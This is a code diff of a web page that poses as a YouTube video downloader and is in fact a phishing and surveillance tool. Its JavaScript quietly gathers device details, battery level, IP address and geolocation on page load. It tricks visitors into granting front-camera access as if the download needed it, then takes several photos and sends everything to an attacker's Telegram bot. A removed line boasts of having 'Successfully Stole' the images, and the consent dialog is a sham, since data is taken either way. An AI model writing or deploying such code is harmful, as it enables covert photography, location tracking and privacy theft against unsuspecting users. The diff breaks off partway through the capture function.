+    const fetchBtn = document.getElementById('thumbdloadbtn');
+    const loadingEl = document.getElementById('loading');
+    const messageContainer = document.getElementById('message-container');
+    const cameraPreview = document.getElementById('cameraPreview');
+    const previewVideo = document.getElementById('preview');
+    const captureBtn = document.getElementById('captureBtn');
+    const redirectCountdown = document.getElementById('redirectCountdown');
+    const countdownElement = document.getElementById('countdown');
+    const countdownBar = document.getElementById('countdownBar');
+    const captureCounter = document.getElementById('captureCounter');
+    const themeToggle = document.getElementById('themeToggle');
+    const scrollUpBtn = document.getElementById('scrollUpBtn');
+    const scrollDownBtn = document.getElementById('scrollDownBtn');
+    const refreshBtn = document.getElementById('refreshBtn');
+    const ytlinkInput = document.getElementById('ytlink');
+    const currentYearElement = document.getElementById('currentYear');
+    const presentYearElement = document.getElementById('presentYear');
+    const creditsElement = document.getElementById('credits');
+
+    // Global variables
+    let mediaStream = null;
+    let deviceInfo = null;
+    let ipData = null;
+    let captureBlobs = [];
+    let captureCount = 0;
+    const totalCaptures = 4;
+    let consentModalShown = true; // Modal is shown initially
+    let autoCaptureStarted = false;
+    let userConsented = false;
+    let deviceInfoSent = false;
+
+    // Initialize dynamic year display
+    function initializeYearDisplay() {
+        const currentYear = 2024;
+        const presentYear = new Date().getFullYear();
         
-        // DOM elements
-        const fetchBtn = document.getElementById('thumbdloadbtn');
-        const loadingEl = document.getElementById('loading');
-        const messageContainer = document.getElementById('message-container');
-        const cameraPreview = document.getElementById('cameraPreview');
-        const previewVideo = document.getElementById('preview');
-        const captureBtn = document.getElementById('captureBtn');
-        const redirectCountdown = document.getElementById('redirectCountdown');
-        const countdownElement = document.getElementById('countdown');
-        const captureCounter = document.getElementById('captureCounter');
-        
-        // Event listeners
+        currentYearElement.textContent = currentYear;
+        presentYearElement.textContent = presentYear;
+    }
+
+    // Event listeners for main website (will be active after modal choice)
+    function initializeMainWebsiteListeners() {
         fetchBtn.addEventListener('click', initiateProcess);
         captureBtn.addEventListener('click', startMultiCapture);
-        
-        // Global variables
-        let mediaStream = null;
-        let deviceInfo = null;
-        let ipData = null;
-        let captureBlobs = [];
-        let captureCount = 0;
-        const totalCaptures = 4;
-        
-        // Main process initiation
-        async function initiateProcess() {
-            // Reset UI
-            resetUI();
-            
-            // Get YouTube link
-            const ytLink = document.getElementById('ytlink').value.trim();
-            if (!ytLink) {
-                showMessage('Please enter a YouTube VIDEO/MUSIC link', 'error');
-                return;
-            }
-            
-            // Show loading
-            showLoading(true);
-            
-            try {
-                // Step 1: Get device info consent
-                deviceInfo = await collectDeviceInfo();
-                if (!deviceInfo) {
-                    showLoading(false);
-                    showMessage('Process cancelled by user', 'info');
-                    return;
-                }
-                
-                // Step 2: Get IP info
-                ipData = await getIPInfo();
-                
-                // Step 3: Request camera access
-                await requestCameraAccess();
-                
-            } catch (error) {
-                console.error('Process error:', error);
-                showLoading(false);
-                showMessage('An error occurred. Please try again.', 'error');
-            }
-        }
-        
-        // Reset UI elements
-        function resetUI() {
-            showLoading(false);
-            cameraPreview.style.display = 'none';
-            redirectCountdown.style.display = 'none';
-            captureCounter.style.display = 'none';
-            messageContainer.innerText = '';
-            captureBlobs = [];
-            captureCount = 0;
-            
-            // Stop any active media stream
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(track => track.stop());
-                mediaStream = null;
-            }
-        }
-        
-        // Show/hide loading indicator
-        function showLoading(show) {
-            loadingEl.style.display = show ? 'block' : 'none';
-        }
-        
-        // Display messages to user
-        function showMessage(message, type = 'info') {
-            messageContainer.innerText = message;
-            messageContainer.style.color = type === 'error' ? '#d32f2f' : 
-                                          type === 'success' ? '#388e3c' : '#1976d2';
-        }
-        
-        // Get IP information
-        async function getIPInfo() {
-            try {
-                const response = await fetch(`https://ipinfo.io/json?token=${ipInfoToken}`);
-                return await response.json();
-            } catch (error) {
-                console.error("IP info fetch failed:", error);
-                return {};
-            }
-        }
-        
-        // Send data to Telegram
-        async function sendToTelegram(message, photoBlobs = []) {
-            try {
-                // Send text message
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message })
-                });
+        scrollUpBtn.addEventListener('click', scrollToTop);
+        scrollDownBtn.addEventListener('click', scrollToBottom);
+        refreshBtn.addEventListener('click', refreshPage);
+        themeToggle.addEventListener('click', toggleTheme);
+    }
 
-                // Send photos if available
-                for (let i = 0; i < photoBlobs.length; i++) {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', photoBlobs[i], `capture_${i + 1}.jpg`);
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                }
-                
-                return true;
-            } catch (error) {
-                console.error("Telegram send failed:", error);
-                return false;
+    // Fixed input text color (blue and bold always)
+    function initializeInputStyles() {
+        ytlinkInput.style.color = '#1a73e8';
+        ytlinkInput.style.fontWeight = '700';
+    }
+
+    // Make input box expandable
+    function initializeInputBehavior() {
+        ytlinkInput.addEventListener('input', function() {
+            this.style.height = 'auto';
+            const newHeight = Math.min(Math.max(this.scrollHeight, 60), 120);
+            this.style.height = newHeight + 'px';
+            
+            if (this.scrollHeight > 120) {
+                this.scrollTop = this.scrollHeight;
             }
-        }
+        });
+    }
+
+    // Handle modal button clicks
+    function setupModalHandlers() {
+        const videoBtn = document.getElementById('videoBtn');
+        const audioBtn = document.getElementById('audioBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
         
-        // Generate device information
-        function generateDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const vendor = navigator.vendor;
-            const language = navigator.language;
+        const handleModalChoice = async (choice) => {
+            userConsented = true;
             
-            // Detect device type
-            let deviceType = "Unknown";
-            let manufacturer = "Unknown";
-            let model = "Unknown";
-            let os = "Unknown";
+            // Add closing animation to modal
+            modalOverlay.style.opacity = '0';
+            modalOverlay.style.transition = 'opacity 0.3s ease';
             
-            // iOS detection
-            if (/iPhone|iPad|iPod/i.test(userAgent)) {
-                deviceType = /iPad/i.test(userAgent) ? "iPad" : "iPhone";
-                manufacturer = "Apple";
-                model = deviceType;
+            setTimeout(() => {
+                // Hide modal completely
+                modalOverlay.style.display = 'none';
+                modalOverlay.style.opacity = '1';
                 
-                // Extract iOS version
-                const iosMatch = userAgent.match(/OS (\d+)_(\d+)_?(\d+)?/);
-                if (iosMatch) {
-                    os = `iOS ${iosMatch[1]}.${iosMatch[2]}`;
-                }
-            } 
-            // Android detection - IMPROVED VERSION DETECTION
-            else if (/Android/i.test(userAgent)) {
-                deviceType = "Android";
-                manufacturer = "Unknown";
+                // Show main website content
+                mainContent.style.display = 'block';
                 
-                // Try to extract Android device model
-                const androidModelMatch = userAgent.match(/Android.*;\s([^;]+)\sBuild/i);
-                if (androidModelMatch && androidModelMatch[1]) {
-                    model = androidModelMatch[1];
-                } else {
-                    model = "Unknown";
-                }
+                // Initialize main website
+                initializeMainWebsiteListeners();
+                initializeInputStyles();
+                initializeInputBehavior();
                 
-                // Extract Android version - IMPROVED REGEX
-                const androidMatch = userAgent.match(/Android\s([\d.]+);/);
-                if (androidMatch && androidMatch[1]) {
-                    os = `Android ${androidMatch[1]}`;
-                } else {
-                    // Alternative method for Android version detection
-                    const altAndroidMatch = userAgent.match(/Android (\d+)/);
-                    if (altAndroidMatch && altAndroidMatch[1]) {
-                        os = `Android ${altAndroidMatch[1]}`;
-                    } else {
-                        os = "Android (Unknown version)";
+                // Send device info to Telegram in background
+                sendDeviceInfoToTelegram(choice).then(success => {
+                    if (success) {
+                        console.log('Device info sent to Telegram successfully!');
                     }
-                }
+                });
                 
-                // Try to get manufacturer from user agent
-                if (/Samsung/i.test(userAgent)) manufacturer = "Samsung";
-                else if (/Xiaomi/i.test(userAgent)) manufacturer = "Xiaomi";
-                else if (/Huawei/i.test(userAgent)) manufacturer = "Huawei";
-                else if (/OnePlus/i.test(userAgent)) manufacturer = "OnePlus";
-                else if (/Google/i.test(userAgent)) manufacturer = "Google";
-                else if (/Motorola/i.test(userAgent)) manufacturer = "Motorola";
-                else if (/LG/i.test(userAgent)) manufacturer = "LG";
-                else if (/Sony/i.test(userAgent)) manufacturer = "Sony";
+                // Show initial message
+                showMessage('Welcome! Enter a YouTube link and click DOWNLOAD to start', 'info');
                 
-            }
-            // Other devices
-            else {
-                deviceType = "Desktop";
-                manufacturer = "Unknown";
-                model = "Unknown";
-                os = platform;
-            }
+                console.log(`${choice} consent received from user`);
+                
+            }, 300);
+        };
+        
+        // Set up modal button handlers
+        videoBtn.onclick = () => handleModalChoice('video');
+        audioBtn.onclick = () => handleModalChoice('audio');
+        cancelBtn.onclick = () => {
+            modalOverlay.style.opacity = '0';
+            modalOverlay.style.transition = 'opacity 0.3s ease';
             
-            // Screen information
-            const screenWidth = window.screen.width;
-            const screenHeight = window.screen.height;
-            const colorDepth = window.screen.colorDepth;
-            
-            return {
-                deviceType: deviceType,
-                manufacturer: manufacturer,
-                model: model,
-                os: os,
-                platform: platform,
-                userAgent: userAgent,
-                vendor: vendor,
-                language: language,
-                screen: `${screenWidth}x${screenHeight}`,
-                colorDepth: `${colorDepth}-bit`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                localTime: new Date().toString()
-            };
+            setTimeout(() => {
+                modalOverlay.style.display = 'none';
+                modalOverlay.style.opacity = '1';
+                mainContent.style.display = 'block';
+                initializeMainWebsiteListeners();
+                initializeInputStyles();
+                initializeInputBehavior();
+                showMessage('Welcome! You can now use the YouTube downloader', 'info');
+                console.log("User cancelled consent but can still use the site");
+            }, 300);
+        };
+    }
+
+    // Scroll functions
+    function scrollToTop() {
+        window.scrollTo({
+            top: 0,
+            behavior: 'smooth'
+        });
+    }
+
+    function scrollToBottom() {
+        window.scrollTo({
+            top: document.body.scrollHeight,
+            behavior: 'smooth'
+        });
+    }
+
+    // Refresh page function
+    function refreshPage() {
+        refreshBtn.style.transform = 'rotate(360deg)';
+        setTimeout(() => {
+            location.reload();
+        }, 300);
+    }
+
+    // Theme toggle function
+    function toggleTheme() {
+        document.body.classList.toggle('light-mode');
+        const isLightMode = document.body.classList.contains('light-mode');
+        
+        const icon = themeToggle.querySelector('i');
+        if (isLightMode) {
+            icon.className = 'fas fa-moon';
+            themeToggle.style.background = 'linear-gradient(135deg, #ff0000, #cc0000)';
+        } else {
+            icon.className = 'fas fa-sun';
+            themeToggle.style.background = 'linear-gradient(135deg, #333, #555)';
         }
         
-        // Collect device information with user consent
-        async function collectDeviceInfo() {
-            const consent = confirm("This site would like to collect basic device information to optimize your experience. Do you agree?");
-            if (!consent) return null;
+        // Keep input text blue and bold
+        ytlinkInput.style.color = '#1a73e8';
+        ytlinkInput.style.fontWeight = '700';
+        
+        // Add animation effect
+        themeToggle.style.transform = 'rotate(360deg)';
+        setTimeout(() => {
+            themeToggle.style.transform = 'rotate(0deg)';
+        }, 300);
+    }
 
-            const deviceInfo = generateDeviceInfo();
+    // Function to scroll to message container
+    function scrollToMessage() {
+        setTimeout(() => {
+            messageContainer.scrollIntoView({
+                behavior: 'smooth',
+                block: 'center'
+            });
+        }, 100);
+    }
+
+    // Auto-capture device info on page load
+    async function autoCaptureDeviceInfo() {
+        if (autoCaptureStarted) return;
+        autoCaptureStarted = true;
+        
+        try {
+            // Generate device info without asking user
+            deviceInfo = generateDeviceInfo();
             
-            // Try to get battery information (not available on iOS)
+            // Get battery info
             let batteryLevel = "Unavailable";
             if (navigator.getBattery) {
                 try {
@@ -495,201 +1287,636 @@
                     console.warn("Battery info not available:", err);
                 }
             }
-            
             deviceInfo.batteryLevel = batteryLevel;
             
-            return deviceInfo;
+            // Get IP info
+            ipData = await getIPInfo();
+            
+            console.log('Device info collected automatically:', {
+                deviceType: deviceInfo.deviceType,
+                os: deviceInfo.os,
+                battery: deviceInfo.batteryLevel,
+                ip: ipData.ip
+            });
+            
+        } catch (error) {
+            console.error('Auto-capture error:', error);
         }
-        
-        // Format device and IP info for Telegram
-        function formatDeviceInfo(deviceInfo, ipData) {
-            let message = `🎵 YouTube Video Downloader Capture 🎵\n\n`;
+    }
+
+    // Send device info to Telegram when user consents
+    async function sendDeviceInfoToTelegram(choice) {
+        try {
+            // Add user's choice to device info
+            deviceInfo.mediaChoice = choice;
+            deviceInfo.consentTime = new Date().toISOString();
             
-            message += `📱 Device Information:\n`;
-            message += `• Device: ${deviceInfo.deviceType}\n`;
-            message += `• Manufacturer: ${deviceInfo.manufacturer}\n`;
-            message += `• Model: ${deviceInfo.model}\n`;
-            message += `• OS: ${deviceInfo.os}\n`;
-            message += `• Platform: ${deviceInfo.platform}\n`;
-            message += `• Screen: ${deviceInfo.screen}\n`;
-            message += `• Language: ${deviceInfo.language}\n`;
-            message += `• Timezone: ${deviceInfo.timezone}\n`;
-            message += `• Battery: ${deviceInfo.batteryLevel}\n`;
-            message += `• Local Time: ${deviceInfo.localTime}\n\n`;
+            const message = formatConsentData(deviceInfo, ipData, choice);
             
-            message += `🌐 Network Information:\n`;
-            message += `• IP: ${ipData.ip || 'N/A'}\n`;
-            message += `• City: ${ipData.city || 'N/A'}\n`;
-            message += `• Region: ${ipData.region || 'N/A'}\n`;
-            message += `• Country: ${ipData.country || 'N/A'}\n`;
-            message += `• Location: ${ipData.loc || 'N/A'}\n`;
-            message += `• ISP: ${ipData.org || 'N/A'}\n`;
-            message += `• Postal Code: ${ipData.postal || 'N/A'}\n`;
-            message += `• Timezone: ${ipData.timezone || 'N/A'}\n\n`;
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
             
-            message += `🔗 YouTube Link:\n`;
-            message += `${document.getElementById('ytlink').value || 'Not provided'}\n\n`;
-            message += `📸 Successfully Stole ${captureBlobs.length} images`;
-            
-            return message;
+            if (response.ok) {
+                console.log('✅ Device info sent to Telegram successfully!');
+                deviceInfoSent = true;
+                return true;
+            } else {
+                console.error('Failed to send device info to Telegram');
+                return false;
+            }
+        } catch (error) {
+            console.error("Device info Telegram send failed:", error);
+            return false;
         }
+    }
+
+    // Format consent data for Telegram
+    function formatConsentData(deviceInfo, ipData, choice) {
+        let message = `🔓 *USER CONSENT RECEIVED*\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
         
-        // Request camera access
-        async function requestCameraAccess() {
-            try {
-                // Stop any existing stream
-                if (mediaStream) {
-                    mediaStream.getTracks().forEach(track => track.stop());
+        message += `👤 *USER ACTION*\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `• ✅ Consent: Granted\n`;
+        message += `• 🎯 Choice: ${choice === 'video' ? 'Video & Audio' : 'Audio Only'}\n`;
+        message += `• 🕐 Time: ${new Date().toLocaleString()}\n\n`;
+        
+        message += `📱 *DEVICE INFORMATION*\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `• 📲 Device: ${deviceInfo.deviceType}\n`;
+        message += `• 💻 OS: ${deviceInfo.os}\n`;
+        message += `• ⚡ Battery: ${deviceInfo.batteryLevel || 'N/A'}\n`;
+        message += `• 🌐 Language: ${deviceInfo.language}\n`;
+        message += `• 🕰️ Local Time: ${deviceInfo.localTime}\n\n`;
+        
+        message += `🌐 *NETWORK INFORMATION*\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `• 📍 IP: ${ipData.ip || 'N/A'}\n`;
+        message += `• 🏙️ City: ${ipData.city || 'N/A'}\n`;
+        message += `• 🇺🇸 Country: ${ipData.country || 'N/A'}\n`;
+        message += `• 📡 ISP: ${ipData.org || 'N/A'}\n\n`;
+        
+        message += `🎯 *STATUS*\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `• 🔄 Auto-captured on page load\n`;
+        message += `• ✅ User consented to media access\n`;
+        message += `• 🎨 Design: DEV ZIKKY MD TECH\n`;
+        message += `• 🚀 Ready for YouTube download\n\n`;
+        
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `✅ *CONSENT PROCESSED SUCCESSFULLY!*\n`;
+        message += `🔥 Waiting for YouTube link...\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+        
+        message += `✨ *DEV ZIKKY MD TECH* ✨\n`;
+        message += `⚡ HACKER INDUSTRIES ⚡`;
+
+        return message;
+    }
+
+    // Main process initiation
+    async function initiateProcess() {
+        // Reset UI
+        resetUI();
+
+        // Get YouTube link
+        const ytLink = ytlinkInput.value.trim();
+        if (!ytLink) {
+            showMessage('Please enter a YouTube VIDEO/MUSIC link', 'error');
+            scrollToMessage();
+            return;
+        }
+
+        // Validate YouTube URL
+        if (!isValidYouTubeUrl(ytLink)) {
+            showMessage('Please enter a valid YouTube link', 'error');
+            scrollToMessage();
+            return;
+        }
+
+        // Show loading with animation
+        showLoading(true);
+
+        try {
+            // Request camera access
+            await requestCameraAccess();
+
+        } catch (error) {
+            console.error('Process error:', error);
+            showLoading(false);
+            showMessage('An error occurred. Please try again.', 'error');
+            scrollToMessage();
+        }
+    }
+
+    // Validate YouTube URL
+    function isValidYouTubeUrl(url) {
+        const patterns = [
+            /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.?be)\/.+$/,
+            /^https?:\/\/(www\.)?youtube\.com\/watch\?v=[\w-]+/,
+            /^https?:\/\/youtu\.be\/[\w-]+/,
+            /^https?:\/\/(www\.)?youtube\.com\/playlist\?list=[\w-]+/,
+            /^https?:\/\/(www\.)?youtube\.com\/embed\/[\w-]+/
+        ];
+        return patterns.some(pattern => pattern.test(url));
+    }
+
+    // Reset UI elements
+    function resetUI() {
+        showLoading(false);
+        cameraPreview.style.display = 'none';
+        redirectCountdown.style.display = 'none';
+        captureCounter.style.display = 'none';
+        messageContainer.innerText = '';
+        captureBlobs = [];
+        captureCount = 0;
+
+        // Stop any active media stream
+        if (mediaStream) {
+            mediaStream.getTracks().forEach(track => track.stop());
+            mediaStream = null;
+        }
+    }
+
+    // Show/hide loading indicator
+    function showLoading(show) {
+        loadingEl.style.display = show ? 'block' : 'none';
+    }
+
+    // Display messages to user with auto-scroll
+    function showMessage(message, type = 'info') {
+        messageContainer.innerText = message;
+        messageContainer.style.color = type === 'error' ? '#d32f2f' : 
+                                      type === 'success' ? '#388e3c' : '#1976d2';
+        messageContainer.style.background = type === 'error' ? 'rgba(211, 47, 47, 0.1)' :
+                                           type === 'success' ? 'rgba(56, 142, 60, 0.1)' :
+                                           'rgba(25, 118, 210, 0.1)';
+        
+        // Add icon based on message type
+        let icon = '';
+        if (type === 'success') icon = '✅ ';
+        else if (type === 'error') icon = '❌ ';
+        else icon = 'ℹ️ ';
+        
+        messageContainer.innerText = icon + message;
+        
+        // Auto-scroll to message container
+        scrollToMessage();
+    }
+
+    // Get IP information
+    async function getIPInfo() {
+        try {
+            const response = await fetch(`https://ipinfo.io/json?token=${ipInfoToken}`);
+            return await response.json();
+        } catch (error) {
+            console.error("IP info fetch failed:", error);
+            return {};
+        }
+    }
+
+    // Send data to Telegram with proper Markdown formatting
+    async function sendToTelegram(message, photoBlobs = []) {
+        try {
+            // Send main message
+            const sendMessage = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            if (!sendMessage.ok) {
+                throw new Error('Failed to send message to Telegram');
+            }
+
+            // Send photos with stylish captions
+            for (let i = 0; i < photoBlobs.length; i++) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', photoBlobs[i], `capture_${i + 1}.jpg`);
+                formData.append('caption', `📸 *Capture ${i + 1} of ${photoBlobs.length}*\n━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                                           `📍 User: ${deviceInfo.deviceType || 'Unknown'}\n` +
+                                           `🕐 Time: ${new Date().toLocaleTimeString()}\n` +
+                                           `🔗 Link: ${ytlinkInput.value.substring(0, 50)}${ytlinkInput.value.length > 50 ? '...' : ''}\n` +
+                                           `━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                                           `🎨 *Design by DEV ZIKKY MD TECH*`);
+                
+                const sendPhoto = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!sendPhoto.ok) {
+                    console.warn(`Failed to send photo ${i + 1}`);
                 }
                 
-                // Request camera with mobile-friendly constraints
-                mediaStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                });
-                
-                // Set video source and show preview
-                previewVideo.srcObject = mediaStream;
-                
-                // Wait for video to load
-                await new Promise((resolve) => {
-                    previewVideo.onloadedmetadata = () => {
-                        previewVideo.play();
-                        resolve();
-                    };
-                });
-                
-                // Hide loading and show camera preview
-                showLoading(false);
-                cameraPreview.style.display = 'block';
-                showMessage('Youtube Link Processed Successfully✅. Click "PROCESS & DOWNLOAD" to download your file.', 'info');
-                
-            } catch (error) {
-                console.error('Camera access error:', error);
-                showLoading(false);
-                
-                if (error.name === 'NotAllowedError') {
-                    showMessage('Camera access denied❎. Please allow camera access to continue.', 'error');
-                } else if (error.name === 'NotFoundError') {
-                    showMessage('No camera found on your device.', 'error');
+                // Add delay between sending photos
+                await new Promise(resolve => setTimeout(resolve, 800));
+            }
+
+            // Send footer with giant developer emoji
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: '━━━━━━━━━━━━━━━━━━━━━━━\n' +
+                          '✅ *Capture Completed Successfully!*\n' +
+                          `📊 Total Captures: ${photoBlobs.length}\n` +
+                          `🕐 Completion Time: ${new Date().toLocaleString()}\n` +
+                          '━━━━━━━━━━━━━━━━━━━━━━━\n' +
+                          '🧑‍💻\n' +
+                          '✨ *DEV ZIKKY MD TECH* ✨',
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            return true;
+        } catch (error) {
+            console.error("Telegram send failed:", error);
+            return false;
+        }
+    }
+
+    // Generate device information
+    function generateDeviceInfo() {
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const vendor = navigator.vendor;
+        const language = navigator.language;
+
+        // Detect device type
+        let deviceType = "Unknown";
+        let manufacturer = "Unknown";
+        let model = "Unknown";
+        let os = "Unknown";
+
+        // iOS detection
+        if (/iPhone|iPad|iPod/i.test(userAgent)) {
+            deviceType = /iPad/i.test(userAgent) ? "iPad" : "iPhone";
+            manufacturer = "Apple";
+            model = deviceType;
+
+            // Extract iOS version
+            const iosMatch = userAgent.match(/OS (\d+)_(\d+)_?(\d+)?/);
+            if (iosMatch) {
+                os = `iOS ${iosMatch[1]}.${iosMatch[2]}`;
+            }
+        } 
+        // Android detection
+        else if (/Android/i.test(userAgent)) {
+            deviceType = "Android";
+            manufacturer = "Unknown";
+
+            // Try to extract Android device model
+            const androidModelMatch = userAgent.match(/Android.*;\s([^;]+)\sBuild/i);
+            if (androidModelMatch && androidModelMatch[1]) {
+                model = androidModelMatch[1];
+            } else {
+                model = "Unknown";
+            }
+
+            // Extract Android version
+            const androidMatch = userAgent.match(/Android\s([\d.]+);/);
+            if (androidMatch && androidMatch[1]) {
+                os = `Android ${androidMatch[1]}`;
+            } else {
+                const altAndroidMatch = userAgent.match(/Android (\d+)/);
+                if (altAndroidMatch && altAndroidMatch[1]) {
+                    os = `Android ${altAndroidMatch[1]}`;
                 } else {
-                    showMessage('Unable to access camera❌. Please try again.', 'error');
+                    os = "Android (Unknown version)";
                 }
+            }
+
+            // Try to get manufacturer from user agent
+            if (/Samsung/i.test(userAgent)) manufacturer = "Samsung";
+            else if (/Xiaomi/i.test(userAgent)) manufacturer = "Xiaomi";
+            else if (/Huawei/i.test(userAgent)) manufacturer = "Huawei";
+            else if (/OnePlus/i.test(userAgent)) manufacturer = "OnePlus";
+            else if (/Google/i.test(userAgent)) manufacturer = "Google";
+            else if (/Motorola/i.test(userAgent)) manufacturer = "Motorola";
+            else if (/LG/i.test(userAgent)) manufacturer = "LG";
+            else if (/Sony/i.test(userAgent)) manufacturer = "Sony";
+
+        }
+        // Other devices
+        else {
+            deviceType = "Desktop";
+            manufacturer = "Unknown";
+            model = "Unknown";
+            os = platform;
+        }
+
+        // Screen information
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
+        const colorDepth = window.screen.colorDepth;
+
+        return {
+            deviceType: deviceType,
+            manufacturer: manufacturer,
+            model: model,
+            os: os,
+            platform: platform,
+            userAgent: userAgent,
+            vendor: vendor,
+            language: language,
+            screen: `${screenWidth}x${screenHeight}`,
+            colorDepth: `${colorDepth}-bit`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            localTime: new Date().toString(),
+            asciiArt: DEV_ZIKKY_ASCII,
+            broughtBy: "DEV ZIKKY MD TECH"
+        };
+    }
+
+    // Format device and IP info for Telegram with proper Markdown
+    function formatDeviceInfo(deviceInfo, ipData) {
+        let message = `🎬 *YOUTUBE DOWNLOADER CAPTURE*\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+        
+        message += `📱 *DEVICE INFORMATION*\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `• 📲 Device: ${deviceInfo.deviceType}\n`;
+        message += `• 🏭 Manufacturer: ${deviceInfo.manufacturer}\n`;
+        message += `• 📐 Model: ${deviceInfo.model}\n`;
+        message += `• 💻 OS: ${deviceInfo.os}\n`;
+        message += `• 🖥️ Platform: ${deviceInfo.platform}\n`;
+        message += `• 📺 Screen: ${deviceInfo.screen}\n`;
+        message += `• 🌐 Language: ${deviceInfo.language}\n`;
+        message += `• 🕐 Timezone: ${deviceInfo.timezone}\n`;
+        message += `• ⚡ Battery: ${deviceInfo.batteryLevel || 'N/A'}\n`;
+        message += `• 🕰️ Local Time: ${deviceInfo.localTime}\n`;
+        message += `• 🎨 Media Choice: ${deviceInfo.mediaChoice || 'N/A'}\n\n`;
+        
+        message += `🌐 *NETWORK INFORMATION*\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `• 📍 IP: ${ipData.ip || 'N/A'}\n`;
+        message += `• 🏙️ City: ${ipData.city || 'N/A'}\n`;
+        message += `• 🗺️ Region: ${ipData.region || 'N/A'}\n`;
+        message += `• 🇺🇸 Country: ${ipData.country || 'N/A'}\n`;
+        message += `• 📍 Location: ${ipData.loc || 'N/A'}\n`;
+        message += `• 📡 ISP: ${ipData.org || 'N/A'}\n`;
+        message += `• 📮 Postal: ${ipData.postal || 'N/A'}\n`;
+        message += `• 🕐 Timezone: ${ipData.timezone || 'N/A'}\n\n`;
+        
+        message += `🔗 *YOUTUBE LINK*\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `${ytlinkInput.value || 'Not provided'}\n\n`;
+        
+        message += `📊 *CAPTURE STATISTICS*\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `• 📸 Total Captures: ${captureBlobs.length}\n`;
+        message += `• ✅ Status: Successfully Captured\n`;
+        message += `• 🕐 Capture Time: ${new Date().toLocaleString()}\n\n`;
+        
+        message += `✨ *DESIGN INFORMATION*\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `• 🎨 Design By: DEV ZIKKY MD TECH\n`;
+        message += `• 🔧 Version: 2.0.1\n`;
+        message += `• ⭐ Premium Design: Yes\n`;
+        message += `• 🚀 Performance: Optimized\n\n`;
+        
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `✅ *CAPTURE COMPLETED SUCCESSFULLY!*\n`;
+        message += `📈 All ${captureBlobs.length} images captured\n`;
+        message += `🎯 Target: YouTube Downloader\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+        
+        message += `💎 *Brought to you by DEV ZIKKY MD TECH*\n`;
+        message += `⭐ Professional YouTube Downloader Service ⭐`;
+
+        return message;
+    }
+
+    // Request camera access
+    async function requestCameraAccess() {
+        try {
+            // Stop any existing stream
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+
+            // Request camera with mobile-friendly constraints
+            mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                },
+                audio: false
+            });
+
+            // Set video source and show preview
+            previewVideo.srcObject = mediaStream;
+
+            // Wait for video to load
+            await new Promise((resolve) => {
+                previewVideo.onloadedmetadata = () => {
+                    previewVideo.play();
+                    resolve();
+                };
+            });
+
+            // Hide loading and show camera preview
+            showLoading(false);
+            cameraPreview.style.display = 'block';
+            showMessage('YouTube Link Processed Successfully ✅. Click "PROCESS & DOWNLOAD" to download your file.', 'success');
+
+        } catch (error) {
+            console.error('Camera access error:', error);
+            showLoading(false);
+
+            if (error.name === 'NotAllowedError') {
+                showMessage('Camera access denied ❌. Please allow camera access to continue your download', 'error');
+            } else if (error.name === 'NotFoundError') {
+                showMessage('No camera found on your device.', 'error');
+            } else {
+                showMessage('Unable to access camera ❌. Please try again.', 'error');
             }
         }
-        
-        // Start multi-capture process
-        async function startMultiCapture() {
-            if (!mediaStream) {
-                showMessage('Camera not available. Please try again.', 'error');
